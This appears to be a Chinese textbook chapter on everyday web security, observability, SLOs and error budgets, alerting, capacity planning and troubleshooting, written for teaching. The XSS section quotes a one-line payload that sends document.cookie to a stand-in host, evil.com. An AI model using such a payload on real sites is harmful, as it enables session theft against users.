## $\rm \S \, 32.1$ 日常防御

你不需要成为安全专家才能防御最常见的攻击。Web 应用最常被攻击的五条路径：

### $\rm \S \, 32.1.1$ SQL 注入

在[SQL 从零开始](../07-应用开发/26-SQL从零开始.md)中你用一个具体例子看到了 SQL 注入的破坏力。防御只需一条规则：**永远用参数化查询，永远不拼接用户输入构造 SQL**。

### $\rm \S \, 32.1.2$ XSS（跨站脚本攻击）

用户输入了一段文本 `"<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"`，你的前端把它直接插入 DOM——这段脚本在访问者的浏览器中执行。

防御：**永远不把用户输入直接插入 HTML**。React 默认对所有变量进行 HTML 转义（`<` 变成 `&lt;`），Vue 同理。如果你确实需要渲染用户提供的 HTML（如 Markdown 渲染），用专门的清洗库（如 DOMPurify）。

### $\rm \S \, 32.1.3$ 敏感数据泄露

你给队友发了一段代码：

```python
# 反面示例：把连接串（含密码）硬编码进源码；这里用占位符代替真实密码
DATABASE_URL = "postgresql://admin:<password>@db.example.com/paperdb"
```

这段代码被提交到了公开的 GitHub 仓库。Git 历史是永久的——即使你在下一个 commit 删掉了这行，任何人都可以 checkout 到旧 commit 看到密码。

防御：**敏感信息永远不进入源码**——用环境变量、Secret 管理服务（如 GitHub Secrets）、或加密的配置文件（如 Ansible Vault）。如果已经泄露，立即轮换密钥/密码（在服务商端生成新的——仅仅删除旧文件不够）。

`.env` 和 GitHub Secrets 保护的是**项目**的密钥。你自己个人的密钥（GitHub Token、数据库密码）存在哪里？不是 `notes.txt`——那是明文，还会被同步软件带上云。用**密码管理器**：**Bitwarden**（开源，免费额度够用，可自托管）或 **1Password**（体验精致，付费）。两者都有命令行工具（`bw`、`op`），可以把取密钥写进脚本——比翻笔记快，也比明文文件安全。

### $\rm \S \, 32.1.4$ 认证与授权缺陷

你的 API 有认证（知道你是谁）但没有授权（检查你有没有权限做这件事）。用户 A 登录后修改了 URL 中的 ID：`DELETE /api/papers/42`——删除了用户 B 创建的论文 42。

防御：**每个涉及资源的操作都要检查“当前用户是否有权限”。** 不能只在前端隐藏删除按钮——攻击者可以直接用 curl 发 DELETE 请求。

### $\rm \S \, 32.1.5$ 依赖漏洞

你的 `requirements.txt` 中有 50 个包——其中 5 个有已知安全漏洞，2 个已经两年没有更新了。攻击者扫描到你的应用使用了某个存在 RCE（远程代码执行）漏洞的旧版本库。

防御：**定期扫描依赖**（`pip-audit`、`npm audit`），升级有安全补丁的包，移除不再维护的依赖。

### $\rm \S \, 32.1.6$ 哈希与校验

[文本、编码、压缩包与常见数据格式](../02-终端与工具/06-文本编码压缩包与数据格式.md)中你已经用哈希验证过下载文件。那里的直觉在这里升级成安全工具：**哈希函数**（hash function）把任意长度的输入映射为固定长度的输出——SHA-256（Secure Hash Algorithm 256）的输出永远是 256 比特（64 个十六进制字符），输入是 `"abc"` 还是整个系统镜像都一样。它的两个性质分别支撑两件事：

1. **相同输入必定相同输出**——验证完整性。`sha256sum 下载的文件` 和发布方公布的哈希一致，说明文件一个字节都没被改动。
2. **找不到两个不同输入产生相同输出**（碰撞，collision；准确说是“计算上不可能找到”）——防伪造。攻击者无法构造一个内容不同、哈希却恰好相同的“替身文件”来冒充你的发布物。

Git 的每个 commit 本质上就是一个 SHA-1 哈希：对提交内容、作者信息和父提交哈希整体计算——所以文件哪怕改一个字节再提交，commit ID 就完全变了，历史无法悄悄篡改（详见 [Git 与团队协作](../05-开发工作流/19-Git与团队协作.md)）。

**HMAC**（Hash-based Message Authentication Code，基于哈希的消息认证码）是带密钥的哈希：只有持有同一密钥的人才能算出相同的摘要。它既验证完整性（内容没被改）又验证身份（确实是持有密钥的一方）——HTTPS 的 TLS 握手和很多 API 签名都基于它。

## $\rm \S \, 32.2$ 可观测性：三根支柱

“为什么网站慢了”不能靠猜。你需要证据。三种证据类型构成可观测性：

### $\rm \S \, 32.2.1$ 日志（Logs）：记录发生了什么

```
[2026-03-15T14:32:01.123Z] [INFO] [req-abc123] GET /api/papers?tag=transformer → 200 (23ms)
[2026-03-15T14:32:02.456Z] [ERROR] [req-def456] POST /api/papers → 500: Database connection timeout (5000ms)
```

好的日志包含：时间戳（毫秒级）、级别、唯一请求 ID、做了什么、结果和耗时。不好的日志是 `cout << "error" << endl`——没有时间、没有请求 ID（没法关联到具体是哪个用户的操作）、没有上下文。

### $\rm \S \, 32.2.2$ 指标（Metrics）：量化“系统整体怎么样了”

- **QPS**（Queries Per Second）：每秒收到多少个请求。突然从 10 跳升到 1000——是正常流量还是 DDoS（Distributed Denial of Service，分布式拒绝服务攻击）？
- **P50/P95/P99 延迟**：50%/95%/99% 的请求在多少毫秒内完成。P50=50ms 但 P99=5000ms 表示“大部分请求很快，但少数请求极慢”——可能是数据库锁等待或 GC（Garbage Collection，垃圾回收）暂停。
- **错误率**：5xx 响应的比例。超过 1% 需要立即关注。

### $\rm \S \, 32.2.3$ 链路追踪（Traces）：一个请求走了哪些路

用户的一个 `GET /api/papers` 请求经历了：Nginx（1ms）→ 后端路由（0.5ms）→ 参数校验（0.1ms）→ 数据库查询（18ms）→ JSON 序列化（2ms）。链路追踪让你看到**瓶颈在哪一步**——而不是猜“应该是数据库慢吧”。

### $\rm \S \, 32.2.4$ 工具速览

| 工具 | 定位 | 起步难度 |
|---|---|---|
| **Sentry**（sentry.io） | 错误追踪——自动收集 crash 堆栈和上下文 | 低（SDK 一行代码） |
| **Grafana + Prometheus** | 指标 + 仪表板 | 中（需配置导出器） |
| **ELK Stack**（Elasticsearch + Logstash + Kibana） | 集中式日志搜索 | 高（维护成本高） |
| **OpenTelemetry**（opentelemetry.io） | 统一可观测性标准——日志/指标/链路一把抓 | 中 |
| **Uptime Kuma** | 自托管健康检查和告警 | 低（Docker 一键启动） |

### $\rm \S \, 32.2.5$ 结构化日志与脱敏

§32.2.1 的日志示例是给人读的一行文本。当你要在几百万行里找“所有 500 响应且耗时超过 $3000\text{ ms}$ 的请求”时，纯文本变成了一场正则噩梦——不同代码路径打印格式不一致，加一个字段就要改所有解析规则。

**结构化日志**（structured logging）把每条日志写成一行 JSON，字段名固定、机器可解析：

```json
{"ts":"2026-03-15T14:32:01.123Z","level":"info","req_id":"req-abc123","method":"GET","path":"/api/papers","status":200,"duration_ms":23,"user_id":42}
{"ts":"2026-03-15T14:32:02.456Z","level":"error","req_id":"req-def456","method":"POST","path":"/api/papers","status":500,"duration_ms":5000,"error":"db timeout"}
```

一行一条（**JSON Lines**）是为了流式处理方便：日志采集器不需要读完整个文件就能解析每条记录。好处很具体：

- 查询变成按字段过滤：`status=500 AND duration_ms>3000`，而不是猜日志里的空白和括号。
- 新增字段不影响旧解析——读 `path` 的脚本不会因为多了 `user_id` 而挂掉。
- 字段类型明确：`duration_ms` 是数字，可以直接算分位数，不用从 `"(5000ms)"` 里抠字符串。

Python 标准库的 `json` 模块配合 `logging` 就能做到，工程中常用 `structlog` 或直接自写 formatter。关键是**字段名在项目内统一**：时间戳用 `ts` 还是 `timestamp`、请求 ID 用 `req_id` 还是 `requestId`，一开始就要定下来，否则跨服务查询仍然困难。

**日志里绝不能写密码、token、身份证号、银行卡号。** 这不是理论风险：日志的访问面比数据库宽得多——采集器、日志平台、开发者的终端、报错时贴到群里的截图，都在读它。一个真实的后果链条是：某次接口报错，日志把整个请求体打了进去，其中包含用户的 `password` 或 `Authorization: Bearer <token>`；这些日志被采集到云端并保留 30 天；任何有日志查看权限的人（未必有数据库权限）搜索该字段就能拿到一批可用凭据；而 token 往往还能直接用于登录，攻击者不需要破解任何密码。事后你不能只删除日志——采集器可能已同步、平台已备份并且可能被导出。

防御做法有四层，通常同时用第一、二层：

1. **不打敏感字段**：显式列出要记录的字段，而不是 `log(request.body)` 这种整体倾倒。
2. **在写入前脱敏**：把 `password`、`token`、`authorization`、`id_card` 等字段名替换成 `"***"`。中间件的实现方式是按字段名递归过滤。
3. **用哈希代替原值**：确需关联同一用户时，记录 `sha256(user_id + 服务端密钥)` 的截断值，既能关联又不可反推。
4. **访问控制与保留期**：日志平台的查询权限按最小必要授予，并设置保留期限。

```python
import json, re, logging

SENSITIVE = re.compile(r'(pass|pwd|token|secret|authorization|cookie|id_?card)', re.I)

def scrub(obj):
    """递归把敏感字段的值替换为 ***，供日志 formatter 调用。"""
    if isinstance(obj, dict):
        return {k: ('***' if SENSITIVE.search(k) else scrub(v)) for k, v in obj.items()}
    if isinstance(obj, list):
        return [scrub(v) for v in obj]
    return obj

logging.info(json.dumps(scrub({"user": "alice", "password": "hunter2", "path": "/api/papers"}),
                        ensure_ascii=False))
# 输出：{"user": "alice", "password": "***", "path": "/api/papers"}
```

> **安全提示**：脱敏不能只做“打印时替换”，还要检查**异常堆栈**里是否带了请求体。很多框架的报错信息默认包含局部变量，写日志时要把异常对象也过一遍过滤，或者只记异常类型与消息，不记完整上下文。

**日志采样**：高流量服务把每个请求都记成 `info` 级日志，一天能产生数十 GB，既贵又淹没真正有用的信息。**采样**（sampling）指只保留一部分：例如对成功请求按 $1\%$ 采样、错误请求 $100\%$ 保留。原则很简单——**保留所有错误日志，只对正常流量抽样**，因为错误才是排查依据。采样率要记进日志本身（加一个 `sampled: true` 字段），否则你会误把“只有 1% 请求”当成真实流量。若使用链路追踪，采样最好与 trace 关联，保证同一条链路的日志要么都留、要么都不留。

### $\rm \S \, 32.2.6$ trace context：跨服务把同一个请求串起来

§32.2.3 讲了链路追踪能看到一个请求在各步骤的耗时。当服务拆成多个后（前端容器、后端容器、数据库、外部 API），**这些服务各自的日志里都有请求记录，但怎么知道哪几条属于同一个用户请求？**

答案是给请求分配一个贯穿全程的标识，并在服务之间传递。这就是 **trace context**（追踪上下文）。W3C 定义了标准的 `traceparent` HTTP 头：

```text
traceparent: 00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01
              │  │                                │                │
              │  │                                │                └ sampled 标志（01=采样）
              │  │                                └ span-id：当前这一步的 ID
              │  └ trace-id：整条链路的 ID，全程不变
              └ version
```

一条链路由若干 **span**（跨度）组成：一次请求在“网关”是一个 span，在“后端处理”是一个 span，在“数据库查询”又是一个 span。除了根 span，每个 span 通过 **parent span id** 指向它的上游——这构成一棵树，正是“一个请求走了哪些路”的结构。

工作方式是：**入口服务生成（或沿用上游传来的）`trace-id`，为本次处理生成 `span-id`，然后把这两个值放进 `traceparent` 请求头，转发给下游。** 下游再生成自己的 `span-id`，把收到的 `span-id` 记为自己的 parent，继续往下传。任意一步的日志只要带上 `trace-id`，就能把散落在各服务日志里的记录重新拼成完整链路。

为什么需要它：没有它时，一次跨服务的慢请求只会表现为“后端某条日志耗时 $2000\text{ ms}$”，你无法知道这 $2000\text{ ms}$ 是在等数据库、等外部 API，还是网络本身慢——只能靠时间戳去人工猜。有了 trace context，你在追踪界面点开那一条慢链路，直接看到瓶颈落在哪个 span 上。

实现方式：OpenTelemetry（§32.2.4 表中那一项）的 SDK 会自动生成 span 并在常见 HTTP 客户端里注入 `traceparent`，在服务端自动解析。如果手写，核心只有两条：

```python
# 服务端：进入请求时解析上游上下文，作为自己的 parent
import re, secrets
def parse_traceparent(header):
    m = re.match(r'^00-([0-9a-f]{32})-([0-9a-f]{16})-([0-9a-f]{2})$', header or '')
    if m:
        return m.group(1), m.group(2)      # trace_id, parent_span_id
    return secrets.token_hex(16), None     # 上游没带：自己开一条新链路

# 出站调用时把 trace-id 与本步 span-id 继续传下去
def make_traceparent(trace_id, span_id, sampled='01'):
    return f'00-{trace_id}-{span_id}-{sampled}'
# 请求头里加：headers['traceparent'] = make_traceparent(trace_id, new_span_id)
```

需要说明的边界：`traceparent` 本身**不携带身份信息**，它不是认证手段——收到外部传入的 trace 头时应当校验格式，不要信任其中的值做任何权限判断。跨公网传递时，有些团队会在边界服务处重新生成 trace-id，避免外部污染内部链路。

## $\rm \S \, 32.3$ SLI、SLO、SLA 与 error budget

前两节解决“怎么观测”。但“系统现在好不好”还需要一个可以对外承诺、可以验证的判据——否则“有点慢”“好像还行”没法驱动任何决策。

三个词经常混着用，它们是**层层递进**的关系：

- **SLI**（Service Level Indicator，服务水平指标）：一个**实际测量**出来的数值。例如“过去 $5$ 分钟的请求成功率”，定义要精确到可计算：分子/分母分别是什么、在哪里测（网关还是应用内部）。
- **SLO**（Service Level Objective，服务水平目标）：你给这个 SLI 设的**内部目标**。例如“$30$ 天内成功率 $\geq 99.9\%$”。
- **SLA**（Service Level Agreement，服务水平协议）：对**客户/合同**承诺的水平，带违约后果（退款、赔付）。它是商业条款，通常比 SLO 宽松，因为你要留出犯错余量。

顺序是先有 SLI（能测什么），再定 SLO（想做到多少），最后才是 SLA（敢对外承诺多少）。跳过 SLI 直接写 SLO，“可用性 $99.9\%$”就是一句无法验证的口号——你甚至不知道它算的是 HTTP 状态码、页面能否加载，还是用户能否完成搜索。

**SLI 的常见选法**（按用户可感知程度排）：

| SLI | 定义 | 适用 |
|---|---|---|
| 可用性 | 成功请求数 / 总请求数 | 通用起点，但要明确“成功”的定义（2xx？还是 2xx+3xx？） |
| 延迟 | 在 $X\text{ ms}$ 内完成的请求比例 | 不能用平均值，要用分位数（§32.6 解释原因） |
| 吞吐 | 每秒处理的请求数 | 容量与限流相关 |
| 正确性 | 返回结果正确的请求比例 | 有明确校验逻辑时（如搜索结果非空） |
| 新鲜度 | 数据延迟（如“$5$ 分钟内的新论文已可见”） | 批处理与数据管道 |

**从 SLI 定 SLO 的步骤**：①选一个用户真的在意的 SLI；②测量当前的基线（先别定目标，看现在是多少）；③根据业务后果选择目标（不是越高越好，每一个 $9$ 都更贵）；④定义窗口（$30$ 天滚动窗口最常见）。

**error budget**（错误预算）是这套体系里最有用的概念：如果 SLO 是 $30$ 天内可用性 $99.9\%$，那么“允许失败”的比例就是 $0.1\%$。把它换算成时间：

$$
30 \text{ 天} \times 24 \text{ 小时} \times 60 \text{ 分钟} \times (1 - 0.999) = 43200 \times 0.001 = 43.2 \text{ 分钟}
$$

也就是**每月大约 43 分钟不可用**。这就是你这个月可以花掉的全部“错误预算”。换成请求数更直观：若一个月有 $1000$ 万次请求，$0.1\%$ 就是 $1$ 万次失败。

error budget 的用途是**把“要不要发版”从感觉变成算术**：

- **预算还有剩**：说明系统比目标更稳，可以放心上线新功能、做实验，接受一点额外风险。
- **预算花完了**：本月剩余时间**冻结发布**（只允许修 bug 和稳定性改进），并把工程资源优先投入稳定性。这不是惩罚，而是“既然已经用光了允许的失败额度，就不能再引入新风险”的直接推论。
- **预算长期用不完**：说明 SLO 定得太松，可以收紧，或者放宽发布节奏、减少为稳定性做的过度投入。

SLO 不是越高越好：$99.9\%$ 到 $99.99\%$ 意味着允许的停机时间从每月 $43$ 分钟缩到 $4.3$ 分钟，通常需要多副本、自动故障转移、更严格的发布流程——成本可能数倍于 $99.9\%$。选择依据是**业务后果**：内部工具挂一小时也许无所谓，支付接口挂一分钟就是事故。

## $\rm \S \, 32.4$ RED 与 USE：该看哪个面板

有了指标之后，最常见的困境是“面板太多不知道看哪个”。两个方法论把对象分成两类，各给三个要看的指标。

**RED** 用于**服务**（请求驱动的组件：API、微服务、消息消费者）：

- **Rate**（速率）：每秒多少请求。
- **Errors**（错误）：失败请求的速率或比例。
- **Duration**（时长）：请求耗时分布（分位数，不是平均值）。

**USE** 用于**资源**（被消耗的东西：CPU、内存、磁盘、网络接口）：

- **Utilization**（利用率）：资源有百分之多少的时间在忙。
- **Saturation**（饱和度）：有多少工作排队等待（队列长度、等待时间）。
- **Errors**（错误）：资源层面的错误计数（磁盘坏块、网络丢包、分配失败）。

对照关系可以这样记：

| | 问题 | 指标 | 典型来源 |
|---|---|---|---|
| **RED** | 从我提供的服务看，用户感受如何？ | 请求速率、错误率、延迟分位数 | 应用日志/指标、网关、APM |
| **USE** | 从被我消耗的资源看，哪里接近极限？ | CPU/内存/磁盘利用率、队列长度、丢包 | `docker stats`、`top`、`iostat`、`node_exporter` |

**判断该看哪个面板**的方法：按“先看症状、再看原因”的顺序。用户报“网站慢”，先看 **RED**——是错误率升高（Duration 可能正常但 Errors 涨），还是延迟分位数升高？确认症状所在的 RED 指标后，再去对应的资源上看 **USE**：延迟升高而 CPU 利用率不高但饱和度（排队/等待）很高，问题可能不在 CPU 而在 I/O 或锁等待；CPU 利用率接近 $100\%$ 且饱和度高，才是真的算力不足。**RED 告诉你“坏了没有”，USE 告诉你“为什么坏”。** 反过来先盯 CPU 面板容易迷路：CPU 不高不代表系统健康，而 CPU 打满也不一定影响用户（若请求量很小）。

对论文管理器这种单服务部署，实践上就是：在 Grafana 上建一行 RED 面板（QPS、5xx 率、P50/P95/P99），再建一行 USE 面板（容器 CPU/内存、磁盘使用率、连接数）。故障时先扫第一行，哪个指标异常再下钻第二行。

## $\rm \S \, 32.5$ 告警：为什么按原因告警会淹没值班人

### $\rm \S \, 32.5.1$ 告警疲劳

最容易写的告警是**按原因**写的：“CPU 超过 $80\%$ 告警”“磁盘使用率超过 $70\%$ 告警”“内存超过 $90\%$ 告警”。它们的问题不是不准，而是**与用户是否受影响无关**：

- 一次正常的批处理任务会让 CPU 短时打满，用户毫无感觉，告警响了。
- 磁盘涨到 $70\%$ 可能一个月后才需要处理，告警每天响十次，直到所有人都学会忽略它。
- 真正的事故（注册接口全返回 500）反而不触发任何 CPU/磁盘告警。

后果是**告警疲劳**（alert fatigue）：值班人每天收到几十条不需要行动的告警，逐渐形成“先放着”的习惯；当真正的故障来临时，它淹没在噪声里被一起忽略。告警的价值不在数量，而在**每条都能对应一个明确动作**。

### $\rm \S \, 32.5.2$ 症状化告警

正确做法是**按症状告警**：告警条件直接对应用户可感知的 SLI 违反（§32.3），而不是内部原因。

坏告警与改好的告警对比：

| | 坏告警 | 改好的告警 |
|---|---|---|
| 条件 | CPU 使用率 $> 80\%$ 持续 $5$ 分钟 | 5xx 错误率 $> 1\%$ 持续 $5$ 分钟，或 P95 延迟 $> 2\text{ s}$ 持续 $10$ 分钟 |
| 触发时用户状态 | 可能完全正常 | 一定受影响，或即将受影响 |
| 值班人动作 | 打开面板看一眼，无法判断要不要处理 | 立刻按排障流程处理：查日志 → 定位版本/依赖 → 回滚或扩容 |
| 误报率 | 高（批处理、编译都会触发） | 低（错误率不会无缘无故升高） |
| 是否消耗 error budget | 无关联 | 直接关联（§32.3） |

原因类指标并非无用，它们适合**看板与容量规划**，不适合**半夜叫醒人**。CPU、内存、磁盘这类资源指标更应该在“预测即将耗尽”时告警（例如“按当前增长速度，磁盘将在 $24$ 小时内填满”），而不是在“超过了某个静态阈值”时就响。

一条可用的告警应当满足三个条件：①有明确的、用户可感知的触发条件；②有一条写在告警通知里的处理步骤或文档链接；③有明确的关闭条件（否则会一直重复通知）。做不到第三条的告警，会被手动静音，等于不存在。

## $\rm \S \, 32.6$ 指标基数爆炸

给指标加标签（label）能让你按维度切分——`http_requests_total{path="/api/papers", status="200"}` 按路径和状态码分别统计。但如果给标签填上全量动态值，会出问题：

```
# 反面示例：把 user_id 和完整 URL 当标签
http_requests_total{user_id="100001", path="/api/papers?tag=transformer&page=3"}
http_requests_total{user_id="100002", path="/api/papers?tag=bert&page=7"}
...
```

**基数**（cardinality）指一个指标下**不同的标签组合数量**。上面的写法里，`user_id` 有 $10$ 万个取值、`path` 带上查询参数后有无穷多种组合——每出现一个新组合，监控系统就要新建一条时间序列（time series）并永久保留一份内存与磁盘结构。$10$ 万用户 $\times$ 几十种路径，轻松达到千万级序列，Prometheus 这类系统的内存会被耗尽、采集超时、查询变慢，**最终整个监控崩掉**——不是变慢，是挂掉。最坏情况是“监控先于业务挂”，故障发生时你没有任何数据。

原则：**标签只用低基数、有界的取值**。判断方法很简单——问“这个字段可能的不同取值有多少个？会一直在增长吗？”

| 字段 | 取值数量 | 能否做标签 |
|---|---|---|
| HTTP 方法 | 约 $10$ 个 | 可以 |
| 状态码 | 几十个 | 可以 |
| 路由模板 `/api/papers/:id` | 几十个 | 可以（**必须是模板，不是真实路径**） |
| 服务名、环境（prod/staging） | 几个 | 可以 |
| user_id、订单号、session id | 十万到无限 | **不可以**放在指标标签里 |
| 完整 URL（含查询参数） | 近似无限 | **不可以** |
| 时间戳、错误消息原文 | 无限 | **不可以** |

高基数信息不是不能观测，而是要去**别的工具**里看：

- **日志**：把 `user_id`、完整 URL、错误原文写进结构化日志（§32.2.5），按需检索。日志的存储结构本来就是为高基数搜索设计的。
- **链路追踪**：`trace-id`、具体请求的参数放在 span 属性里，用于单次请求的深挖。
- **指标只保留聚合**：需要按用户分组的统计，用“分桶”而不是“每个值一个标签”，例如记录 `active_users_total{tier="free"}` 而不是为每个用户建序列。

一句话总结分工：**指标回答“整体趋势与比例”（低基数、聚合），日志与追踪回答“具体是哪个请求、哪个用户”（高基数、明细）。** 把明细塞进指标，等于用错了存储引擎。

## $\rm \S \, 32.7$ 容量规划与压测

### $\rm \S \, 32.7.1$ 估算需要多少实例

容量规划回答“按现在和未来的流量，我需要几个实例”。它的输入是三个量：**峰值请求速率**、**单实例能承载的速率**、**安全余量**。

$$
\text{所需实例数} = \left\lceil \frac{\text{峰值 QPS} \times (1 + \text{安全余量})}{\text{单实例可持续处理的 QPS}} \right\rceil
$$

举例：观测到论文管理器在最忙的时候是 $50$ 次请求/秒（注意用峰值，不是日均值），压测测得单个后端实例在 P95 延迟不超过 $200\text{ ms}$ 的前提下能稳定处理 $40$ 次/秒，留 $50\%$ 余量以应对突发和单实例故障：

$$
\left\lceil \frac{50 \times 1.5}{40} \right\rceil = \lceil 1.875 \rceil = 2
$$

两个实例，其中一个挂掉仍能承载 $40$ 次/秒（略低于峰值，但配合限流可以撑到恢复）。安全余量不是随手加的 $50\%$——它要考虑：流量突发的幅度、单实例故障时的降级能力、以及扩容需要多久才能生效。**关键是“单实例能承载多少”必须来自压测**，不能凭感觉填，因为缓存命中率、数据库连接池大小、依赖服务的响应时间都会改变这个数。

### $\rm \S \, 32.7.2$ 压测要测什么

**压测**（load testing）是用工具（k6、Locust、wrk、ab）按可控的速率向服务发请求，观察在不同压力下的表现。要测的不是“能不能响应”，而是四组量：

1. **吞吐**：服务在延迟还合格的前提下能处理多少 QPS（这就是容量规划要的那个数）。
2. **延迟分位数**：P50、P95、P99。这是最能说明问题的指标。
3. **错误率**：随压力升高，错误何时开始出现、以什么形式出现（超时、连接拒绝、5xx）。
4. **拐点**：压力继续增加后，吞吐是否开始**下降**（不是持平）。吞吐下降意味着系统过载：请求互相争抢资源、重试放大流量、超时占用连接，此时增加压力反而处理得更少。

**“平均延迟”为什么会骗人**：假设 $100$ 个请求里 $99$ 个用 $10\text{ ms}$、$1$ 个用 $10\text{ s}$，平均值是

$$
\frac{99 \times 10 + 1 \times 10000}{100} = \frac{990 + 10000}{100} = 109.9 \text{ ms}
$$

平均约 $110\text{ ms}$，看起来“还行”。但真实体验是：$1\%$ 的用户等了 $10$ 秒——对一个每天 $100$ 万请求的接口，就是每天 $1$ 万个用户体验到卡顿。而如果这 $1\%$ 恰好是下单、支付这类关键操作，损失直接可算。

平均值掩盖尾部的原因很简单：它是求和除以个数，少数极大值被大量小值摊平了。**分位数**（percentile）则直接刻画分布的形状：P99 是“最慢的 $1\%$ 的起点”，它对应的正是最倒霉那部分用户的体验。选哪个分位数取决于业务——面向大量用户的接口常看 P99，内部批处理更关心 P50 或吞吐。

一个实用的压测与观察流程：先用一个固定速率跑几分钟，确认 P95/P99 与错误率稳定；然后阶梯式提高速率，观察 P99 何时开始快速上升、错误率何时越过 $1\%$、吞吐何时开始下降——那个点就是当前配置的容量上限。压测**要针对与生产相同的配置和环境**，在开发机上用 SQLite 测出的数字推不出生产容量；同时要意识到压测流量本身可能对共享数据库造成影响，应在独立环境或明确可控的窗口内进行。

## $\rm \S \, 32.8$ 故障排查：从现象到根因

### $\rm \S \, 32.8.1$ 五类信号，五个问题

出问题时，按顺序问：

1. **现象是什么？** 用户说“网站打不开”——具体是什么？白屏？500 错误？一直转圈？
2. **时间范围？** 什么时候开始的？持续了多久？自己恢复了还是还在持续？
3. **影响范围？** 所有人还是个别用户？所有功能还是只一个页面？
4. **最近有什么变化？** 部署了新版本？改了数据库？改了配置文件？流量突然增加？
5. **哪一层出问题？** 回顾[域名、HTTPS、代理与排障](../04-网络/24-域名HTTPS代理与排障.md)中的分层排障框架——DNS → TCP → TLS → HTTP → 应用 → 数据库，从下往上逐层排除。

### $\rm \S \, 32.8.2$ 常见故障模式

| 症状 | 第一检查 | 命令 |
|---|---|---|
| “网站完全打不开” | 服务是否在运行？ | `docker ps` / `systemctl status` |
| “加载极慢” | 数据库连接池是否耗尽？ | `docker stats` + `htop` |
| “偶尔 500” | 后端日志中的错误 | `docker compose logs backend \| grep ERROR` |
| “搜索没结果” | 数据库是否有数据？索引还在吗？ | `psql` → `SELECT COUNT(*) FROM papers` |
| “磁盘满了” | 日志是否没轮转？ | `df -h` / `du -sh /var/lib/docker` |
| “内存不足” | 哪个容器吃内存？ | `docker stats` → `pmap -x PID` |

### $\rm \S \, 32.8.3$ 故障复盘

每次故障修复后，不是“还好修好了”就翻篇。花五分钟记录：

1. 发生了什么（一句话）。
2. 第一信号是什么（用户报告 / 监控告警 / 自己发现）。
3. 根因是什么（不要写“数据库挂了”——为什么挂？连接池耗尽了还是磁盘满了？）。
4. 修复做了什么。
5. 怎样防止复发（加监控、加限流、加自动化恢复）。

这份“故障报告”是团队最宝贵的知识资产——下次类似故障就不需要从头排查。

## $\rm \S \, 32.9$ 动手实践

### $\rm \S \, 32.9.1$ 实践一：故意制造故障

在你的 Docker Compose 部署中（本地练习环境，不要拿生产环境演练）：

1. 故意把后端端口号写错（参考[日常系统管理：软件、用户、服务与日志](../03-计算机系统/13-系统服务日志与软件安装.md) §13.7 的故障演练）——例如把 Compose 里的 `8000:8000` 改成 `8001:8000`。成功判据：`docker compose up -d` 后 `curl http://localhost:8000/api/papers` 报 `Connection refused`（或反向代理返回 502）。
2. 用 `docker compose logs` 找到错误——成功判据：日志里出现连接失败或端口不匹配的线索（`Connection refused`、`no such host` 等）。
3. 用分层排障方法（TCP → HTTP → 应用 → 数据库）定位根因——成功判据：能说出根因（如“容器发布到 8001，而代理仍指向 8000”）并改回配置，再 `curl` 返回 200。

> 前置：本地有一套可运行的 Docker Compose 部署（第 30 章 §30.5）；只在本地/测试环境做。成功判据：复现失败 → 从日志定位 → 恢复服务并返回 200。清理：把端口配置改回原值，`docker compose up -d` 重建，确认 `curl` 返回 200。

### $\rm \S \, 32.9.2$ 实践二：添加基础可观测性

1. 在你的后端中添加请求日志（记录每个请求的方法、路径、状态码和耗时）——成功判据：每访问一次 API，日志就多一条含这四项的记录。
2. 把日志改成 JSON 行（§32.2.5）：同一个请求用一行 `{"ts":...,"level":...,"req_id":...,"method":...,"path":...,"status":...,"duration_ms":...}` 输出——成功判据：`docker compose logs backend` 每行都是可被 `python -c "import json,sys; json.loads(sys.stdin.readline())"` 解析的合法 JSON，且同一请求的多条日志（如进入与完成）带同一个 `req_id`。
3. 给日志加脱敏（§32.2.5）：用 §32.2.5 的 `scrub()` 思路过滤请求体，只记录白名单字段——成功判据：故意用一个包含 `"password"` 字段的请求体调用 API，日志里该字段显示为 `"***"`，原文不出现在任何一行。
4. 安装 Uptime Kuma 并配置对 `https://papers.example.com/api/health` 的监控（本地可用 `docker run -d --restart unless-stopped --name uptime-kuma -p 3001:3001 -v uptime-kuma:/app/data louislam/uptime-kuma:1`，再访问 `http://localhost:3001`）——成功判据：监控项状态为绿色 UP（首次检查要等一个心跳周期）。
5. 故意停止后端（`docker compose stop backend`），确认 Uptime Kuma 发出告警——通知渠道和心跳周期因人而异，成功标志是下一轮心跳内状态变为 DOWN，且你配置的通知渠道收到告警（通知渠道要事先在设置里添加）。
6. 把上一步的告警对比写成两条条件（§32.5）：一条按原因（“CPU 使用率 $>80\%$”），一条按症状（“5xx 错误率 $>1\%$ 持续 $5$ 分钟”或“`/api/health` 连续 3 次探测失败”）。成功判据：能说出按原因的那条为什么不需要立即行动（用户可能完全正常、批处理也会触发），以及按症状那条对应哪个 SLI。
7. 算一次 error budget（§32.3）：给论文管理器的可用性定一个 SLO，把窗口设为 $30$ 天，算出允许不可用的分钟数——成功判据：写出算式 $30\times24\times60\times(1-\text{SLO})$ 并给出结果（例如 SLO $99.9\%$ 时为 $43.2$ 分钟），说明预算用完后你打算冻结发布还是继续发版。

> 前置：后端有可访问的 `/health`（或 `/api/health`）端点，且该地址能从 Uptime Kuma 容器内访问（生产域名最省事；监控宿主机上的本地服务要用 `host.docker.internal` 或主机 IP——容器里的 `localhost` 指向容器自己）。成功判据：UP → 停后端变 DOWN 并收到告警 → 恢复后回到 UP；日志为可解析的 JSON 行且敏感字段已脱敏；能算出 SLO 对应的 error budget。清理：`docker compose start backend` 恢复服务；不再需要监控时 `docker rm -f uptime-kuma`，历史数据在命名卷 `uptime-kuma` 中，按需删除。

### $\rm \S \, 32.9.3$ 实践三：安全审计

1. `pip-audit` 扫描 Python 依赖的安全漏洞——成功判据：输出依赖漏洞清单；没有已知漏洞时打印 `No known vulnerabilities found`。（未安装先 `pip install pip-audit`，或 `pipx run pip-audit`。）

## $\rm \S \, 32.10$ 总结

- **安全五条**：防注入（参数化查询）、防 XSS（HTML 转义）、不泄露密钥、检查授权（不只是认证）、扫描依赖漏洞。
- **可观测性三根支柱**：日志（发生了什么）、指标（系统整体怎么样）、链路追踪（一个请求走了哪些路）。日志用 JSON 行结构化、写入前脱敏（密码/token/身份证绝不进日志）、只对正常流量采样；跨服务用 W3C `traceparent` 传递 trace context，把一次请求在各服务的记录串成一条链路。
- **SLI 是测出来的指标，SLO 是内部目标，SLA 是对外承诺**（通常比 SLO 宽松）。error budget = 允许的失败额度（$99.9\%$ 可用性约等于每月 $43$ 分钟），用完就冻结发布并优先修稳定性。
